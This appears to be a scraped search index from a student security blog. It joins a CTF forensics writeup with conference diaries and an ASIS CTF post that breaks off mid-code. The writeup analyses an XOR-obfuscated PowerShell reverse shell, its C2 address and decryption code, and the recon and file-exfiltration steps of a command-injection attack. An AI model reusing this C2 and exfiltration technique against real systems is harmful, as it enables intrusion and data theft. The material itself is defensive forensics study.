NEVER do this with wild scripts - that’s executing malware for hackers XDDD (TA was very disappointed they should’ve kept C\u0026C Server open to pop a calculator on connecting students www) About the code above, two parts: Get-Xor function simply XORs input with xor_passwd. Insufficient xor_password length gets repeated padding. Can test in PowerShell if needed. Note: result strings aren’t always printable (don’t manually copy ASCII from wireshark==). From line 13 is C\u0026C Server connection establishment. Commands sent and received info both get Get-Xor obfuscation - that’s why a whole wireshark section is unreadable. iex (Invoke-Expression) is the execution part, similar to Python’s eval - dangerous functions easily abused by hackers. Knowing the obfuscation method, we can restore! Not sure how you dumped ciphertext - I used Python to extract and decrypt specified packet strings simultaneously. Brief explanation of scapy package usage. python # Python3 \u003e\u003e\u003e from scapy.all import * \u003e\u003e\u003e pkts = rdpcap('./reverse_shell.pcap') # read pcap file \u003e\u003e\u003e type(pkts) # check data type \u003cClass 'scapy.plist.PacketList'\u003e \u003e\u003e\u003e pkts[0].show() # use show() or display() to see info in packet ###[ Ethernet ]### dst = ff:ff:ff:ff:ff:ff src = 08:00:27:8c:d3:ad type = IPv4 ###[ IP ]### version = 4 ... \u003e\u003e\u003e pkts[0]['IP'].src # show specific field info '10.0.2.15' Using above approach to find specified info. Code for reference. python from scapy.all import * pkts = rdpcap('reverse_shell.pcap') with open('out.raw', 'w') as f: for p in pkts: if 'IP' in p and ( p['IP'].src == '45.79.159.73' or p['IP'].dst == '45.79.159.73' ): if 'Raw' in p and ( p['TCP'].sport==39637 or p['TCP'].dport==39637 ): raw = p['Raw'].load xor_passwd = \"x0R_\" res = \"\" for idx, word in enumerate(raw): res += chr(word ^ ord(xor_passwd[idx%4])) f.write(res) Decrypting and writing while extracting data. Successful result is nice~ MacacaHub-result.out Results show the hacker uploaded secret.docx to C\u0026C Server from victim host. Next step is extracting the file. File is hidden in the given packet file. I got stuck here for a while - turns out most friends extracted the word f","date":"2020-11-03","objectID":"/en/posts/2020/nsysu-htcf-hw1/:1:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x01 Writeup","uri":"/en/posts/2020/nsysu-htcf-hw1/#solution"},{"categories":["Cyber Security"],"content":" Problem What’s the victim host’s external (physical) IP address? 140.117.169.233 What IP address and port does the hacker’s C2 host use? 45.79.159.73:39637 Which VPS provider hosts the C2? Linode Can directly Google “whois” online tools for domain info, or install package and query (as shown) What encryption algorithm encrypts the reverse shell TCP connection content? What’s the encryption key? XOR cipher, x0R_ What’s the AD domain name where the victim host resides? macaca.lab What’s the IP address in the victim host’s AD domain? 192.168.77.30 What’s the DNS host name and IP address in the AD domain? dc.macaca.lab, 192.168.77.10 What caused the website vulnerability? The website has RCE (Remote Code Execution) command injection vulnerability, and input parameters weren’t format-checked, allowing hackers to inject C\u0026C malware and leak information. What port does the data exfiltration website use? 42794 What’s the flag? flag{p0w3rsh3ll_1s_funny} ","date":"2020-11-03","objectID":"/en/posts/2020/nsysu-htcf-hw1/:1:3","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x01 Writeup","uri":"/en/posts/2020/nsysu-htcf-hw1/#problem"},{"categories":["Cyber Security"],"content":" Extra Note Please try to fully explain the attack event flow from the hacker exploiting website vulnerability to data exfiltration Presumed original website function: input IP returns Ping IP results. But backend didn’t format-check inputs and had RCE vulnerability for hacker exploitation. Hacker attack flow: Hacker first used dir command successfully making website execute and return info, confirming RCE vulnerability. Then used PowerShell’s undetectable-by-Windows feature for fileless attack, executing commands to AD subdomain host. Commands mainly established C\u0026C Server connection, obfuscating input commands and returned info through Get-Xor function to increase forensic analysis difficulty for security personnel. After getting user privilege for host command execution, hacker collected intelligence including: current user (whoami), network card info (ipconfig /all), system info (systeminfo), arp records (arp -a), domain hosts info (nslookup), finally exploring directories. Hacker moved from C:\\Users\\web\\xampp\\htdocs to C:\\Users\\web\\Desktop\\_, finding passwords.txt with ftp, docx, sso passwords. Also found secret.docx under C:\\Users\\web\\Downloads, finally uploading via PowerShell command to C\u0026C Server. ","date":"2020-11-03","objectID":"/en/posts/2020/nsysu-htcf-hw1/:1:4","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x01 Writeup","uri":"/en/posts/2020/nsysu-htcf-hw1/#extra"},{"categories":["Free Writing"],"content":"2020 Summer security conference notes Part 3 - CISC, HITCON","date":"2020-09-27","objectID":"/en/posts/2020/2020-summer-conf-p3/","series":null,"tags":["CISC","HITCON"],"title":"[Sharing] 2020 Summer Conf. PART 3","uri":"/en/posts/2020/2020-summer-conf-p3/"},{"categories":["Free Writing"],"content":" A month later there were two more security-related Conferences. Though timing-wise not really “Summer Conf.”, I’m not planning a new series - just continuing updates here XD ","date":"2020-09-27","objectID":"/en/posts/2020/2020-summer-conf-p3/:0:0","series":null,"tags":["CISC","HITCON"],"title":"[Sharing] 2020 Summer Conf. PART 3","uri":"/en/posts/2020/2020-summer-conf-p3/#"},{"categories":["Free Writing"],"content":" CISC National Information Security Conference (9/1 - 9/4) @NSYSUOriginally scheduled for May, thanks to COVID-19 everything got delayed. This one was special for me - as both host school member and volunteer helper. Compared to previous conferences, fewer sponsors made it somewhat simpler. It’s the 30th year though I’m not sure if previous years were similar - but everyone worked hard to help :3 The four-day conference only had sessions on Day 2 and Day 3. Day 1 had setup in the morning, afternoon our MacacaHub kicked off CISC with “Basic Web Security Practice” (still don’t understand why Day 1 had activities…). Day 4 was excursion - hiking Chaishan Mountain to show monkeys and water activities. Due to rain forecast, the 0-registrant hiking was cancelled (!). Since Day 1 security practice was optional registration, @stavhaygn originally targeted undergrad/master students for basic web security practice. But the registration form showed at least master’s students, even some executives - quite surprising XD. Turned out attendees indeed weren’t specialists in this area, so we couldn’t even cover planned progress (XSS) thoroughly. Holding onto @stavhaygn’s leg we survived Day 1. Spotted a wild IIKM spy Day 2 / Day 3 my main job was partnering with lab junior for Session A paper presentations - floor management/timing/photography and assisting moderator and A1 session judges. Hard to listen attentively QQ. My assigned session had one more group than others, plus uncontrollable Q\u0026A - time explosion inevitable. Almost only me reporting late endings in the worker group chat. Being a time management master isn’t easy. Honestly 10 minutes for a research paper is insufficient, especially with Q\u0026A making it tighter. Hard work, presenters. Worth mentioning: Day 2 banquet at Xiziwan Beach Club. Though seniors seemed used to it, we drank quite a bit (lol) Also Day 3 morning had CISC CTF hosted by MIS department, so MacacaHub rolled up sleeves and joined XDDD. Overall medium-easy difficulty, some Pwn I directly skipped XD. One challenge was supposed to test CVE-2019-18634, but since all contestants shared the host, after Googling the CVE I directly ran history command and saw previous contestant’s git pulled PoC - directly used for privilege escalation and Flag XDDDDD Also two consecutive SQLi challenges - same -- comment worked in SQLi-1 but not SQLi-2. Thought it was whitespace bypass failure (/**/), but post-competition discussion revealed changing comment to // got the flag… I was steadily 4th place. Last 40+ minutes I focused on analyzing Windows event log. Though I used event analysis tools to restore PowerShell commands, execution failed QQ. Post-competition heard @stavhaygn used strings to dump commands, also unsuccessful (at least no slow restoration like me XD). By the time I noticed, I’d dropped to 5th, less than 50 points behind 4th… Oh, because I didn’t do Welcome(50) lol XD. Anyway took home Rising Star Award~ BTW top three: @CSY54, @stavhaygn, @MuMu - all familiar southern security circle faces haha Day 4 was supposed to be hiking and water activities. With hiking cancelled on Day 2, but water activities couldn’t be cancelled, many volunteers were forced into the water (??) - even I was secretly registered by the secretary despite not filling the form XDDD. Used the NT$500 Carrefour voucher from CTF to buy swim trunks : / Some attendees showed up at assembly, possibly expecting hiking or just beach walking - they all turned back :)))) The remaining 10-ish forced-to-participate volunteers had fun with sailing, kayaking, bodyboarding. Some other tour group tourists on shore made it a bit embarrassing XD Finally I really failed at sunscreen and got totally burned XD ","date":"2020-09-27","objectID":"/en/posts/2020/2020-summer-conf-p3/:0:1","series":null,"tags":["CISC","HITCON"],"title":"[Sharing] 2020 Summer Conf. PART 3","uri":"/en/posts/2020/2020-summer-conf-p3/#cisc-national-information-security-conference-91---94-nsysu"},{"categories":["Free Writing"],"content":" HITCON Taiwan Hackers Association (9/11 - 9/12) @Academia SinicaFinally my last planned Conf. this year, also first time going north with lab members - somewhat like a graduation trip (?) Again due to COVID-19, tickets split between online \u0026 physical. Online used open-source game engine minetest for virtual venue - very minecraft-style. Unfortunately I’m not deeply into this. Physical format was same session-based as previous Confs, just no booth games despite having sponsors - saved running around w First time taking HSR to Nangang terminus was quite fresh… though it looks somewhat barren haha We stayed at Lucky Hotel - quite comfortable. As a Taipei native, rarely get to stay at local hotels XDDD Day 0 after check-in we had dinner at YAYOI - bit pricey but I enjoyed it www. My meal even came with instructions (??) Session speakers were many familiar faces: @CK, @Birdman, @Adr, @Big Alan, @Small Alan, @Orange, @Inndy, @ddaa, @yuawn, @Angelboy, @Lays, @Jeffxx - almost all hacker circle celebrities XD. These experts drew big crowds, especially @Orange’s Facebook penetration topic nearly packed R0== Booths were as usual - networking and making friends. Though classmates treated me like a prize wishing machine, even calling me session cockroach… sob. Also our @stavhaygn’s UCCU topic was digital security \u0026 physical security - interesting challenge reminding me of picking my laptop bag lock with paperclips as a kid haha Others like DEVCORE, BambooFox, TeamT5, CHT Security had their own CTF challenges - no booth games but still plenty to do. Also HITCON GIRLS’ “Who is Lily?” OSINT challenge was cool - required finding people at HITCON and sending phishing emails to complete! Official activities included online escape room. Thanks to AIS3 roommate’s invitation, we gathered four people and played in a venue corner, even got photographed by iThome reporter and made news wwwwww. Gameplay mostly described in article. Main obstacle was me and my invited junior never touched minecraft, so movement controls got special attention ww Did we get Flag… forgot w. But found a pwn challenge for teammates. I wandered different rooms finding clues, also played minesweeper on minetest’s in-game computer XD. Post-activity had random gunfight - only remember constantly falling out of bounds : ( Previous years had HITCON tokens, this year too. But being virtual currency, many friends not into it were too lazy to operate - so I social engineered borrowed nearby classmates’ official wallets (300 HITCON tokens) and bought circuit boards from HITCON online store. Day 2 even opened special stickers for purchase… of course I bought them all hehe!! No comparison no pain. Though my first HITCON, compared to other venues it felt somewhat… lacking. Besides missing the traditional circuit board challenge, the mixer also had no-shows. Day 1 registration gave a black box without bag - everyone carried it like treasure. Turns out it’s single-use, broken upon opening, filled with sponsor DMs… no wonder Day 2 they stacked into towers begging people to take them = w = Anyway, still heard interesting topics/keywords at HITCON, just lacking time to review QwQ Next is October’s MOPCON - fourth year attending so probably can’t write experience anymore XDDDDDD That’s it. ","date":"2020-09-27","objectID":"/en/posts/2020/2020-summer-conf-p3/:0:2","series":null,"tags":["CISC","HITCON"],"title":"[Sharing] 2020 Summer Conf. PART 3","uri":"/en/posts/2020/2020-summer-conf-p3/#hitcon-taiwan-hackers-association-911---912-academia-sinica"},{"categories":["Free Writing"],"content":"First year of graduate school life summary and reflections","date":"2020-08-31","objectID":"/en/posts/2020/first-graduate-summary/","series":null,"tags":["Daily Chat"],"title":"[Lab Diary EX] First-Year Graduate Summary","uri":"/en/posts/2020/first-graduate-summary/"},{"categories":["Free Writing"],"content":" One rainy August day, a casual photo on the way home. Hope I can take photos this leisurely next year at this time QQ As time moves into August, I’m about to enter my twenties - time flies so fast… Originally planned to write some posts during summer break, but the schedule got unexpectedly packed XD Plus the usual lab duties \u0026 senior thesis defense support - finally getting a break now… had to steal time from thesis research to write this post (face palm) ","date":"2020-08-31","objectID":"/en/posts/2020/first-graduate-summary/:0:0","series":null,"tags":["Daily Chat"],"title":"[Lab Diary EX] First-Year Graduate Summary","uri":"/en/posts/2020/first-graduate-summary/#"},{"categories":["Free Writing"],"content":" First-Year Graduate Life Reflections?Not sure how everyone else spent their first year of grad school, but looking back it feels quite leisurely (?) Our lab’s first-year focus is on credits \u0026 paper reviewing \u0026 reading papers, plus I personally do CTF activities. Since our advisor is super busy, meeting frequency keeps decreasing… recently discussed returning to normal, but then thanks to COVID-19 and various activities pausing since June Zzzzz. Not sure if I should be happy about that 😅 Also because the advisor is busy, we still haven’t taken any of their courses. Among substitute instructors was an Indian professor that gave my poor English quite a headache QQ. Fortunately survived with lab mates’ CARRY, thanks everyone. If I had to pick one most memorable course, it’d be Network Security - an MIS department professor teaching a required security masters course for CS. Interesting XD As expected, mostly MIS students. The professor stated cryptography wouldn’t go too deep at the start, saying security masters students could skip class - so cool. Though we still obediently studied in class (???) Then the midterm was all essay questions - if I recall, only my score bombed in our lab… truly a diploma mill student wherever I go. But the hands-on and project topics in the second half were interesting - we could freely explore network-related topics, even including CTF!! Then our MacacaHub charged ahead - not only took first place, but cleared the board minus two challenges. \\ @stavhaygn teach me! / Our presentations were treated like club meetings stuffed with weird memes XD. Not many classes let you play like this, highly recommend~ Credits-wise, took 23 credits in one year... 5 short of graduation threshold, quite intense 😤 Paper reviewing apparently isn’t in every lab (?) but I think it’s good practice - finding faults (X) reviewing (O) others’ papers to remind yourself not to make the same mistakes. Just sometimes the deadline is so short you can only rush through with Google Translate which is a shame. Sometimes it’s proposal reviewing - the thick kind - that’s when you really sleep in the lab… no I’m kidding, usually not that hard to review, just one more thing to do XD Remaining time besides gaming is constantly finding papers to read. Honestly still only have a general direction, can’t pin down the topic yet. Especially since I read papers quite slowly and get distracted writing blog posts. Have to feed sections through machine translation - tried reading originals directly but ineffective… really reading without understanding. Finally gave up and translated to Chinese. Bit worried whether poor English will prevent graduation, tsk. ","date":"2020-08-31","objectID":"/en/posts/2020/first-graduate-summary/:1:0","series":null,"tags":["Daily Chat"],"title":"[Lab Diary EX] First-Year Graduate Summary","uri":"/en/posts/2020/first-graduate-summary/#first-year-graduate-life-reflections"},{"categories":["Free Writing"],"content":" Summer Running Around North \u0026 SouthOriginally wanted a new post for this, but goldfish brain as I am, many activities already need effort to recall - not to mention technical details still unread. So using this as part of first-year summary, sharing as travel notes www Anyway, thanks to the pandemic, so many events delayed to summer that I was practically running north-south weekly QwQ Meanwhile, many activities were first-time for me - undergrad years never gave me opportunities to keep going north for activities… This post originally included the following three, but was split out during a blog update =) 2020 Summer Conf. PART 1: AIS3 2020 Summer Camp \u0026 COSCUP 2020 2020 Summer Conf. PART 2: SITCON 2020 \u0026 CYBERSEC 2020 2020 Summer Conf. PART 3: CISC 2020 \u0026 HITCON 2020 ","date":"2020-08-31","objectID":"/en/posts/2020/first-graduate-summary/:2:0","series":null,"tags":["Daily Chat"],"title":"[Lab Diary EX] First-Year Graduate Summary","uri":"/en/posts/2020/first-graduate-summary/#summer-running-around-north--south"},{"categories":["Free Writing"],"content":"2020 Summer security conference notes Part 2 - SITCON, CYBERSEC","date":"2020-08-19","objectID":"/en/posts/2020/2020-summer-conf-p2/","series":null,"tags":["SITCON","CYBERSEC"],"title":"[Sharing] 2020 Summer Conf. PART 2","uri":"/en/posts/2020/2020-summer-conf-p2/"},{"categories":["Free Writing"],"content":" SITCON Students’ Information Technology Conference (8/8) @Academia SinicaDay after AIS3 ended, immediately returned to Kaohsiung for meeting, then back to Taipei a week later. Super busy XD SITCON was a Conference I heard about often during undergrad. Unfortunately after transferring to NUK in sophomore year, I lost motivation to go north. This year pandemic delayed it to summer (usually held in March). Combined with the next CYBERSEC event, of course I’m attending! Also thanks to community friend’s ticket transfer - even helped @tinytsunami grab one. Originally didn’t get tickets planning to use NT$1000 small sponsorship for ticket QQ Then, 8/8 I overslept XDDDD Because I arrived in Taipei late the night before, family left at 6 AM, so I woke up at 5:30 to discuss Father’s Day evening plans, then went back to sleep Zzzz. Later realized I was late and took a taxi spending money wastefully, even missed opening ceremony dammit qq. But the opening animation was really well-made watching later, feels suitable for music game PV. I really admire this kind of student-initiated Conference. Saw many familiar faces from the IT circle. Activities had two main parts: scavenger hunt \u0026 sessions. First the scavenger hunt - basically interact with booths through their APP, complete bingo lines to exchange for items. But break time between sessions was short, so I skipped some sessions to interact with booths, like AMD drink shop (??) and CyCraft ice cream company (???) XDDDDD BTW CyCraft ice cream - I really like this composition, official photo team is so good w But afternoon when I completed all lines, prizes were all gone. Spent too much time listening to sessions (though not a bad thing), only got Love Lottery tickets (didn’t win anyway). Also since everyone connected to venue Wi-Fi, some booth activities requiring FB likes/shares kept getting banned - probably ran out of sessions tsk tsk. About sessions - since it’s student-oriented, I thought it wouldn’t be too difficult… no, I was wrong. Though not completely incomprehensible, enough to feel the technical gap between fellow students. Brief intro to some interesting topics: “First Time Building Escape Room” - IoT, AI, AR combined escape room. Described building each mechanism from scratch. One was a techy ritual platform with laser scanning for matching - actually RFID behind the scenes. Speaker said for outsiders you can claim it’s AI recognition lol. “Playing Win32 Like a K!NG ;)” - Pony adr1 talked about UAC Bypass for hackers to trick system for high privileges, plus DLL Hijacking, Path Normalization for system programs, with demos… honestly sounds scary how easily bypassed = w = “Build Your Own Server Room!” - Server room organization experience. Not just hardware procurement - system layout needs effort too. Also connections matter XDDD - free resources are the best hehe. “Just a Student, Don’t Want to Spend Money Hosting Website” - Originally came for Github Pages alternatives. This session covered URL shortener websites built with free resources, like using Google App Script as database for redirects. Felt like I won’t use it much XD “Even Beginners Can Finish Projects with Love, Right” - Remember it discussed students implementing projects using industry division of labor - engineers, designers, product managers etc. But honestly this one I just happened to hear while resting in R0 (face palm) “CDN Website Attacks - This Time Hackers Are It” - By Mico, highly praised session. Made me understand CDN differently - hackers can use CDN to bypass WAF or indirectly scrape supposedly hidden info. Highly recommend if you have time - discovered lots of domain knowledge to learn QQ Oh right, also Lightning Talks. Honestly after three years of MOPCON, five minutes doesn’t seem easy to get cut off XD Everyone times well. This time one really caught attention… no, caught the whole audience’s attention - playing cloud gaming on R0’s big screen was absolutely wild XDDDD Also secretly left Ma","date":"2020-08-19","objectID":"/en/posts/2020/2020-summer-conf-p2/:0:1","series":null,"tags":["SITCON","CYBERSEC"],"title":"[Sharing] 2020 Summer Conf. PART 2","uri":"/en/posts/2020/2020-summer-conf-p2/#sitcon-students-information-technology-conference-88-academia-sinica"},{"categories":["Free Writing"],"content":" CYBERSEC Taiwan Cyber Security Conference (8/11 - 8/12) @Nangang Exhibition Hall 2Also pandemic-delayed to summer, two-day CYBERSEC. Since it’s two days after SITCON and lab sent people on business trip, I combined the schedule~ This Conference is more enterprise/business-oriented compared to previous ones. Registration to surveys constantly ask about company operations - of course I fill in Lab or MacacaHub (lol) Overall activities split into Expo \u0026 Sessions \u0026 CyberLAB. First CyberLAB hands-on attack/defense practice - unlike sessions, this is small-class teaching (20 people per session, four daily). Day 1 I saw that registration queue and immediately gave up XDDD Expo was like IT fairs - enterprises showcasing R\u0026D achievements. Saw familiar companies like Trend Micro, Microsoft, CyCraft, DEVCORE, CHT Security etc. Official organizers added scavenger hunt elements - interact with booths to meet conditions for different prizes. Official prizes ran out fast, but booth prizes were generous too - saw many people carrying big and small bags… seems everyone’s poor and came for resources definitely not session cockroaches. Through this event I realized there are quite a few pure security companies. Inquiring revealed most work on cases. Honestly security only gets attention when something happens - quite awkward QQ. But some sessions showed units pushing security frameworks, integrating SOPs for preemptive defense - seems like good development space. Most memorable booth was definitely CyCraft. Truly a tech startup - booth activities showed VR simulating internal network penetration, “Cyber IQ Digital Empire Defense” quiz game, security Q\u0026A game, Cyber War card game combining MITRE ATT\u0026CK knowledge. Plus they absorbed many CTF circle talents - expected to be popular with young IT people… not to mention their clothing designs with various Evangelion tributes, so cool XD Session-wise, originally wanted “cloud” topics for my thesis. Sadly didn’t hear interesting technical shares - mostly “human error” permission management basic enterprise concepts or various promotions, bit of a shame Orz. Also habitually attended Pony’s session - that venue layout was… interesting? Apparently previous session had projector issues, so whole venue seats rotated 90 degrees using backup screen. Speaker podium ended up behind audience, with Pony sharing stage with audience XDDDDD After Day 1, I took lab classmates to pilgrimage Tenlong Bookstore - great place with so many IT books to kill time :) Overall CYBERSEC was quite content-rich, mainly due to many participating vendors creating grand scale, also the summer event where I got most free swag (lol) ","date":"2020-08-19","objectID":"/en/posts/2020/2020-summer-conf-p2/:0:2","series":null,"tags":["SITCON","CYBERSEC"],"title":"[Sharing] 2020 Summer Conf. PART 2","uri":"/en/posts/2020/2020-summer-conf-p2/#cybersec-taiwan-cyber-security-conference-811---812-nangang-exhibition-hall-2"},{"categories":["Free Writing"],"content":"2020 Summer security conference notes Part 1 - AIS3, COSCUP","date":"2020-08-05","objectID":"/en/posts/2020/2020-summer-conf-p1/","series":null,"tags":["AIS3","COSCUP"],"title":"[Sharing] 2020 Summer Conf. PART 1","uri":"/en/posts/2020/2020-summer-conf-p1/"},{"categories":["Free Writing"],"content":" AIS3 New-Type Security Food Practical Course (7/27 - 8/2) @NTUSTA security course requiring AIS3 Pre-exam to attend. This year admitted 186 participants if I recall - meaning even students from non-security backgrounds have certain skills to attend. Seven-day course: five days of classes + two days of group project presentations. This year’s groups were Critical Infrastructure, National Security, Digital Forensics, Web Security, Secure Software Development. Group topics relate to projects done during free time. Since I heard it often runs until late, I specifically applied for NTUST dorms despite being a local = w = Then… you can feel from the official arrangement that Critical Infrastructure \u0026 National Security got especially more effort XD During pre-exam chatroom, I heard Critical Infrastructure would teach internal network penetration - sounded interesting, so I put it first. But the course focused mainly on ICS security topics. Iran nuclear plant virus Stuxnet and 2018 TSMC production line infection were frequently brought up for warning. Focus was on Modbus industrial communication protocol, OPC UA automation transmission protocol, SCADA systems. Made brainstorming project topics quite painful - each one would be significant scale (or only simulation). Thanks to teammates for the hard CARRY - last-minute created signature verification using Message Authentication Code (MAC) for plaintext transmission between Operator and PLC against Man-in-the-middle attack, leaving me mostly useless on the side QwQ Other interesting courses: Digital Forensics by @CK on “Chimera APT Attack Investigation: Cases and Investigation Methods” - frontloaded lots of domain knowledge for us to understand, leaving the key points rushed which was a shame. But content was interesting enough that @stavhaygn wanted to switch to Digital Forensics group XD. Lab taught moloch for .pcap packet analysis - another tool besides Wireshark… if I remember how to use it. Secure Software Development by @Ysc on “Development Security and Security Testing” - focus on automation, automation and… automation!! (seriously). Literally what the instructor emphasized at start and end XDDD. Focus on DevOps CI/CD (automated integration and deployment), plus security automated checks to form DevSecOps for better workflow. Made me realize many common tools have these applications: GitHub, GitLab, Docker, Jenkins, Docker. Really eye-opening, probably just me not exposed enough, crying. Also Professor Cheng Hsin-Ming’s hands-on 4G fake base station extracting phone IMSI was interesting - just couldn’t find IMSI on our phones for verification (only found IMEI) which was funny. Finally installed ASCII aquarium on the official computers hehe So where’s the internal network penetration? Hmm, it was in Web Security by Yang Jun-Hao How’s “Red Team Exercise” - a solid AD penetration practice including privilege escalation and lateral movement. 87% similar to my previous Network Security project, just higher penetration level - even hard to keep up XD. Finally National Security umm… can only say awkward. General direction was analyzing online speech or information - people in this area were all… Zzzz reviewing morning’s Red Team Exercise. Seems everyone prefers hands-on practice courses = w = During boredom, the revenge chatroom had many CSS attacks XDDDD Finally this image appeared in the group…. hilarious CSY didn’t even attend but followers still chant his name Oh right, Day 1 \u0026 2 evenings had extra activities, so dinner was sponsored by CyCraft…huh? You ask aren’t they ice cream sellers? Not only that, they even made board games XD Course notes at https://hackmd.io/@AIS3-official/AIS3-2020/, also check out the revenge chatroom - though not as exciting now, back then some high-frequency flashing hurt to watch wwwww That’s about it. Last two days of projects felt subtle. Groups not yet presented were busy with presentations, those done mostly lost interest in continuing to listen (?)","date":"2020-08-05","objectID":"/en/posts/2020/2020-summer-conf-p1/:0:1","series":null,"tags":["AIS3","COSCUP"],"title":"[Sharing] 2020 Summer Conf. PART 1","uri":"/en/posts/2020/2020-summer-conf-p1/#ais3-new-type-security-food-practical-course-727---82-ntust"},{"categories":["Free Writing"],"content":" COSCUP Open Source Conference (8/1 - 8/2) @NTUSTNotice COSCUP timing looks familiar… yes, exactly the last two days of AIS3 project presentations! And both at NTUST (about 5-minute walk) XD So after Critical Infrastructure presented on Day 1 morning, I started planning sessions to attend (afternoon was National Security projects), then snuck out (lol) Booth-wise, @stavhaygn tagged me on MOPCON fan page days earlier joking about wanting stickers. When I skipped class to go, officials immediately recognized me and exceptionally let me take extra, hilarious www. Still don’t dare stick them on my laptop \u003e///\u003c Besides wandering for stickers, I bought wine glass and cable pack at official booth. Accompanying friend laughed that skipping class always has rewards (damn w) Sessions averaged about 30 min. Day 1 mainly booth browsing. Day 2 I really wanted to hear Network Security phishing project and @stavhaygn’s project, so snuck out less often. Sessions I recall: GCP, SDN x Cloud, Golang, Vault private key management, plus an Open Source promotion to pilgrimage Shrimp Sister who often banters with Pony on FB (lol). My time in open source isn’t long - usually just occasionally coding. So topics were mostly heard-of-but-never-touched - went to broaden horizons. Also networking XDDDD Oh, I also got magic codes. Mainly the right .tw free domain registration - thinking of domain names is headache QQ. Also left .GAY promo was quite flashy wwww friends kept pushing me to buy one, thanks ","date":"2020-08-05","objectID":"/en/posts/2020/2020-summer-conf-p1/:0:2","series":null,"tags":["AIS3","COSCUP"],"title":"[Sharing] 2020 Summer Conf. PART 1","uri":"/en/posts/2020/2020-summer-conf-p1/#coscup-open-source-conference-81---82-ntust"},{"categories":["Cyber Security"],"content":"ASIS CTF Quals 2020 participation notes and writeups","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/"},{"categories":["Cyber Security"],"content":" First CTF online of summer, also our MacacaHub’s third battle this year~ Though captain warned us it’d be difficult, prepare mentally. Yep, really hard QwQ 31 total challenges, solved only 4 but still Rank 151 / 815… terrifying== CTFtime link ","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:0:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#"},{"categories":["Cyber Security"],"content":" PrefaceAs shown above, our four solved challenges minus Welcome and Survey(feedback) leaves only two actually solved. Yet still two teams cleared - remember this is just Quals. There’s always someone better… Since only two challenges solved, naturally can’t title this “writeup”. Just sharing experiences and exploring interesting challenges referencing others’ solutions. Actually several weren’t hard after reading writeups - just matter of discovery QQ. ","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:1:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#preface"},{"categories":["Cyber Security"],"content":" Mechanism: Proof of WorkLast encountered PoW in AIS3 EOF CTF 2019’s Ponzi Scheme. Common in blockchain cryptocurrency mechanisms - an economic countermeasure against service/resource abuse or DoS attacks. Requires users to perform appropriately time-consuming complex computations quickly verifiable by service provider. Time, devices, and energy consumed serve as guarantee cost ensuring genuine demand. Also a self-protection mechanism for nc challenges avoiding crashes from mass players poking. Also guessing some challenges might be brute-forceable - this mechanism prevents that. Though not main focus, can’t solve without passing XD. Not every nc challenge has PoW, but checking previous ASIS CTF challenges, PoW implementations differ - can’t directly copy QQ ↓↓↓ For this event, PoW described as ↓↓↓ bash $ nc [ip] [port] \u003e Please submit a printable string X, such that sha224(X)[-6:] = 6be655 and len(X) = 19 haha \u003e You must pass this PoW challenge :P Translation: System requires length-19 string X, where sha224(X) last 6 characters = 6be655. Hash Algorithm varies each connection - tested sha1, sha224, sha256, sha384, sha512, md5…etc. Unlike previous ASIS CTF, added specified input length len(x), also varying each connection with range ~10-40. Due to hash’s irreversibility, can’t reverse from last 6 characters. But same input always gives same output, so we can brute-force generate specified-length inputs, hash them, check if last 6 characters match. My approach: after connecting, string-process to get Hash Algorithm and length. Only target sha256 with length 10, brute-force search string for verification. Simple Python: python from pwn import * import hashlib import string def pow_solve(s): for a in string.printable: for b in string.printable: for c in string.printable: for d in string.printable: for e in string.printable: for f in string.printable: for g in string.printable: for h in string.printable: for i in string.printable: for j in string.printable: if hashlib.sha256(a+b+c+d+e+f+g+h+i+j).hexdigest()[-6:] == s: return a+b+c+d+e+f+g+h+i+j # Usually within 1000 attempts will have sha256 \u0026 len=10 for i in range(1000): r = remote(host, port) # Skip string processing hash_algo = r.recv(6) if s == 'sha256': target = r.recv(6) length = r.recv(2) if int(length) == 10: r.sendline(pow_solve(target)) r.interactive() #solve() r.close() I know some will mock those 10 nested loops, but didn’t want to spend time on DFS - this is most intuitive XD Post-competition found another player’s approach - saved it!! source link python #!/usr/bin/python3 import hashlib import uuid from pwn import * r = remote(\"76.74.178.201\", 8002) info = r.recvuntil(\"\\n\").decode(\"UTF-8\").split(\" \") print(info) algo = info[8].split(\"(\")[0] target = info[10] length = int(info[-1]) print(f\"[*] algo needed: {algo}\") print(f\"[*] target needed: {target}\") print(f\"[*] length needed: {length}\") def random_ascii_generator(l): string = str(uuid.uuid4()).replace(\"-\", \"\")[0:l].encode(\"ascii\") return string[0:l] algo_matching = { \"sha1\": hashlib.sha1, \"md5\": hashlib.md5, \"sha224\": hashlib.sha224, \"sha256\": hashlib.sha256, \"sha384\": hashlib.sha384, \"sha512\": hashlib.sha512, } candidate_hash = \"\" while not candidate_hash[-6:] == target: candidate_string = random_ascii_generator(length) candidate_hash = algo_matching[algo](candidate_string).hexdigest() print(\"[*] PoW found\") r.sendline(candidate_string) print(r.recvline()) # ... Execution looks clean and powerful, so envious \u003e///\u003c P.S. Challenge in image is PPC-Titanic. ","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:2:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#mechanism-proof-of-work"},{"categories":["Cyber Security"],"content":" [Web] Web Warm-up (Solved)Warm up! Can you break all the tasks? I’ll pray for you! read flag.php Link: http://69.90.132.196:5003/?view-source php \u003c?php if(isset($_GET['view-source'])){ highlight_file(__FILE__); die(); } if(isset($_GET['warmup'])){ if(!preg_match('/[A-Za-z]/is',$_GET['warmup']) \u0026\u0026 strlen($_GET['warmup']) \u003c= 60) { 